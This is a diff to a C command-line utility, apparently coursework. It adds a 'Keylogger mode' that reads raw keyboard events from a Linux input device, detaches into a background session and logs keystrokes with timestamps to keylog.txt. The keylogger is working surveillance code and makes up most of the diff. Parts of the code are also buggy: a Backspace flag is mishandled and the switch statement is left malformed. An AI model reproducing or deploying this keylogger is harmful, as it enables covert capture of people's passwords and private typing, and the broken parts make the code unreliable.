@@ -8,6 +8,10 @@
 #include <fcntl.h>
 #include <time.h>
 #include <errno.h>
+#include <sys/ioctl.h>
+#include <linux/input.h>
+#include <ctype.h>
+#include <sys/wait.h>
 
 // ================ File Operations BEGIN (Mode 1) ================
 void create_file(const char *filename, int truncateExisting) {
@@ -101,7 +105,8 @@ void remove_file_op(const char *filename) {
 
 // ================ Directory Operations BEGIN (Mode 2) ================
 // Create directory function
-void create_directory(const char *path) {
+void create_directory(const char *path) 
+{
     if (mkdir(path, S_IRWXU | S_IRWXG | S_IRWXO) == 0) {
         printf("Directory created successfully.\n");
     } else {
@@ -150,6 +155,207 @@ void list_directory(const char *path) {
 }
 // ================ Directory Operations END (Mode 2) ================
 
+// ================ Keylogger Operations BEGIN (Mode 3) ================
+// Write timestamp to keylog.txt
+void write_timestamp(int fd) 
+{
+    time_t t;
+    struct tm *tm_info;
+    char timestamp[26];
+
+    // Get current time and format
+    time(&t);
+    tm_info = localtime(&t);
+    strftime(timestamp, 26, "%Y-%m-%d %H:%M:%S\n", tm_info);
+
+    // Write timestamp to file
+    write(fd, "\n", 1); // New line
+    write(fd, "\n", 1); // New line
+    write(fd, timestamp, strlen(timestamp));
+}
+
+static int isShiftPressed = 0;
+
+// Function to convert keycode to character
+char keycode_to_char(int keycode) 
+{
+    // Define regular key map
+    char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
+    
+    // Define key mapping for shifted keys
+    char *shift_map = "..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"...ZXCVBNM<>?";
+
+    if (keycode == 57) 
+    {
+        return ' ';  // Space key
+    }
+
+    if (keycode == 42) 
+    {
+        isShiftPressed = 1;  // Shift key press
+        return 0;
+    }
+
+    // Detect Ctrl key
+    if (keycode == 29 || keycode == 297 || keycode == 28 || keycode == 14) 
+    {
+        return 0;
+    }
+
+    // Check if keycode is within the valid range
+    if (keycode >= 0 && keycode < KEY_MAX) 
+    {
+        char ch;
+
+        // If Shift is pressed, use the shifted map
+        if (isShiftPressed) {
+            ch = shift_map[keycode];
+            isShiftPressed = 0;  // Reset Shift
+        } else {
+            // Use regular map for non-shifted characters
+            ch = map[keycode];
+        }
+
+        return ch;
+    }
+
+    return 0;  // Return 0 if the keycode is out of range or not mapped
+}
+
+int run_keylogger(const char *input_device) 
+{
+    if (!input_device) 
+    {
+        fprintf(stderr, "No input device specified.\n");
+        return 1;
+    }
+
+    pid_t pid = fork();
+    if (pid < 0) 
+    {
+        perror("Fork failed");
+        return 1;
+    }
+
+    if (pid > 0) 
+    {
+        // Parent process
+        //Print the child process ID
+        printf("Child process PID: %d\n", pid);
+
+        printf("Keylogger operation successful. You may now close this terminal\n");
+
+        exit(0);
+        return 0;
+    }
+
+    // Child process
+    // Step 1: Create a new session and detach from the terminal
+    if (setsid() < 0) 
+    {
+        perror("Failed to create new session");
+        return 1;
+    }
+
+    // Step 2: Redirect output to a log file
+    int output_fd = open("keylog.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
+    if (output_fd == -1) 
+    {
+        perror("Unable to open keylog.txt");
+        return 1;
+    }
+
+    // Write timestamp at the start of the session
+    write_timestamp(output_fd);
+
+    // Step 3: Close standard file descriptors (stdin, stdout, stderr)
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    // Open keylog.txt for output
+    if (dup2(output_fd, STDOUT_FILENO) == -1 || dup2(output_fd, STDERR_FILENO) == -1) 
+    {
+        perror("Failed to redirect output to keylog.txt");
+        return 1;
+    }
+
+    // Step 4: Open the keyboard input device (from CLI argument)
+    int input_fd = open(input_device, O_RDONLY);
+    if (input_fd == -1) 
+    {
+        perror("Unable to open input device");
+        close(output_fd);
+        return 1;
+    }
+
+    struct input_event ev;
+    int isCtrlPressed = 0;
+    int isEnterPressed = 0;
+    int isBackPressed = 0;
+
+    // Capture keystrokes and log them
+    while (1) 
+    {
+        // Read an input event
+        ssize_t bytes_read = read(input_fd, &ev, sizeof(struct input_event));
+        if (bytes_read < (ssize_t)sizeof(struct input_event)) 
+        {
+            perror("Failed to read input event");
+            break;
+        }
+
+        // Only log key events (type 1 is key event)
+        if (ev.type == EV_KEY) 
+        {
+            // If it's a key press event
+            if (ev.value == 1) 
+            {
+                // Check for Ctrl key press
+                if (ev.code == 29 || ev.code == 297) 
+                { // Left or Right Ctrl key
+                    isCtrlPressed = 1;
+                    write(output_fd, "[Ctrl]", 6);  // Log [Ctrl] to the file
+                } 
+                else if (ev.code == 28)
+                {
+                    isEnterPressed = 1;
+                    write(output_fd, "[Enter]", 7);  
+
+                }
+                else if (ev.code == 14)
+                {
+                    isEnterPressed = 1;
+                    write(output_fd, "[Backspace]", 11);  
+
+                }
+                else 
+                {
+                    char key_char = keycode_to_char(ev.code);
+                    if (key_char != 0) 
+                    {
+                        write(output_fd, &key_char, 1); // Write the character to the file
+                    }
+                }
+            } 
+            // If it's a key release event (release Ctrl key)
+            else if (ev.value == 0 && (ev.code == 29 || ev.code == 297 || ev.code == 28 || ev.code == 14)) 
+            {
+                isCtrlPressed = 0;  // Reset Ctrl state on release
+                isEnterPressed = 0;
+                isBackPressed = 0;
+            }
+        }
+    }
+
+    // Close file descriptors
+    close(input_fd);
+    close(output_fd);
+
+    return 0;
+}
+// ================ Keylogger Operations END (Mode 3) ================
+
 // Main function
 int main(int argc, char *argv[]) {
     /*
@@ -168,6 +374,8 @@ int main(int argc, char *argv[]) {
         ./supercommand -m 2 2 myDir                 // Remove directory
         ./supercommand -m 2 3                       // Print working directory
         ./supercommand -m 2 4 myDir                 // List files in directory
+
+        ./sudo supercommand -m 3 /dev/input/event2  // Keylogger mode
 
     */
     if (argc < 3) {
@@ -272,19 +480,28 @@ int main(int argc, char *argv[]) {
         // ========== MODE 3: KEYLOGGER OPERATIONS ==========
         // Keylogger Operation
         case 3:
-            if (argc == 4) {
-                // Keylogger function call 
-                printf("Keylogger functionality is otw.\n");
-            } else {
-                fprintf(stderr, "Invalid keylogger operation.\n");
+            if (argc < 3) 
+            {
+                fprintf(stderr, "Usage: %s -m <mode> [additional arguments]\n", argv[0]);
                 return 1;
             }
-            break;
 
-        // Default case
-        default:
-            fprintf(stderr, "Invalid mode: %d\n", mode);
+            int mode = atoi(argv[2]);
+            if (mode == 3) 
+            {
+                if (argc < 4) 
+                {
+                    fprintf(stderr, "No input device specified for keylogger mode.\n");
+                    return 1;
+                }
+
+                const char *input_device = argv[3];
+                printf("Powering up key logger...\n");
+                return run_keylogger(input_device);
+            }
+
+            fprintf(stderr, "Unknown mode: %d\n", mode);
             return 1;
-    }
+            }
     return 0;
 }
